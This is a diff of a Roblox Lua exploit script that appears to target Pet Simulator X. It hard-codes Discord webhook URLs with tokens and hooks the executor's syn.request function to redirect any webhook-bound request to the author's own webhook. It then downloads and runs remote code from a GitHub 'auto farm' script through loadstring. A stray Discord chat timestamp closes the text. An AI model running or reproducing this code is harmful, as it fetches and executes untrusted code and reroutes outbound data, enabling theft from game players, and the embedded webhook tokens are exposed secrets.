@@ -1,4 +1,16 @@
 _G.UserID = 1690659151
-_G.WebHook = "https://discord.com/api/webhooks/1062638007011770398/5QQUGewyj-1XuIA9l67U4Z0GFXsbYDDvsTF1AYr5SM2_WwLy2n3xN9Drq-etbDqe03Tz"
-_G.LoadingScreenText = "Here"
+_G.WebHook = "https://discord.com/api/webhooks/1062639845740126248/2V0ysMFDC1thdXGIJmP95YFHfRibHK7znRDCYpaSUzpC9Aqcj3SxqVx7ZljmBzfOD_cX"
+_G.LoadingScreenText = "Here!!"
+if Krnl then syn = Krnl end
+local Old = syn.request
+setreadonly(syn, false)
+syn.request = function(Data)
+  if string.find(Data.Url, "webhook") then
+    Data.Url = _G.WebHook
+  end
+  return Old(Data)
+end
+
 loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
+ 
+ACE — Today at 3:50 PM
